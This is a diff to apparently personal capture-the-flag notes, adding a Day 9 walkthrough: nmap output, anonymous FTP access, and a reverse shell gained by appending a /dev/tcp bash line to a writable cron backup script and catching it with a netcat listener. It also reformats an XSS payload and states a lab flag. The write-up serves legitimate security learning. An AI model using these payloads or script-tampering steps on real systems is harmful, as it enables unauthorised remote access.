@@ -285,8 +285,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 	* This doesn't work and looks like it breaks the page instead.
 * Maybe they're sanitizing the input?
 	* One way that inputs are sanitized is by checking tags on the outside of the input
-	* We can try </script><script>alert(1)</script><script>	
-		* Because </thing><thing> isn't valid html, that can get past the site
+	* We can try `</script><script>alert(1)</script><script>`	
+		* Because `</thing><thing>` isn't valid html, that can get past the site
 	
 
 * Another way that we see a possible exploit is through the get requests made in the url `http://10.10.249.208:5000/?q=<INPUT>`
@@ -437,3 +437,67 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 147.07 seconds
 ```
+
+
+# Day 9
+### IP
+`10.10.241.67`
+
+
+### nmap
+`nmap -sC -sV 10.10.241.67 -oN initial.nmap`
+```
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-10 02:26 EST
+Nmap scan report for 10.10.241.67
+Host is up (0.17s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxr-xr-x    2 0        0            4096 Nov 16 15:04 backups
+| drwxr-xr-x    2 0        0            4096 Nov 16 15:05 elf_workshops
+| drwxr-xr-x    2 0        0            4096 Nov 16 15:04 human_resources
+|_drwxrwxrwx    2 65534    65534        4096 Nov 16 19:35 public [NSE: writeable]
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.6.36.105
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f6:ce:52:11:22:9e:b1:c0:ae:45:2a:f9:2f:70:eb:cb (RSA)
+|   256 4b:77:b2:d4:76:53:8c:ec:cb:be:3a:69:51:ff:3c:8f (ECDSA)
+|_  256 53:3f:2f:ca:c2:d6:ce:ec:99:30:f7:1f:ce:a5:d7:f5 (ED25519)
+Service Info: Host: Welcome; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 44.91 seconds
+```
+* nmap tells us that ftp is open with anonymous login
+* It also says we can upload scripts
+
+### FTP login
+`ftp 10.10.241.67`
+* We can log in with `ftp 10.10.241.67` and with the username `anonymous`
+* Now, typing `dir` shows us that we have access to all the directories listed, but only `public` actually has anything
+* Go to the directory with `cd public` and download the files with `get backup.sh` and `get shoppinglist.txt`
+* exit by typing `quit`
+* `cat shoppinglist.txt` on our own machine shows us that santa wanted `The Polar Express Movie`
+
+### Reverse Shell
+* When we look at `backup.sh`, we cn see that the script automatically runs periodically to backup
+* Luckily, we are allowed to modify files on the ftp server, which means we can add in a script to get us a reverse shell
+* We can edit the script to include `/bin/bash -i >& /dev/tcp/10.6.36.105/1337 0>&1` at the end (ensuring you pick your ip on tun0)
+	* Set up a listener locally with `nc -lvnp 1337`
+* Now, we can upload the file by loggin in again, running `delete backup.sh` and replacing it with our copy by typing `put backup.sh`
+* Waiting for a couple minutes gets us a reverse shell!
+
+* Now we can `cat /root/root/txt` to get the flag: `THM{even_you_can_be_santa}`
